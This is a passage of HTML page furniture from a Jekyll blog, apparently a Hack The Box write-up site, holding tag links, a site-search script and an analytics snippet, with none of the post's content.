href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/openbsd/">openbsd</a> <a class="post-tag" href="/tags/port-fowarding/">port fowarding</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/windows-iot/">windows iot</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://freddiphish.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script>
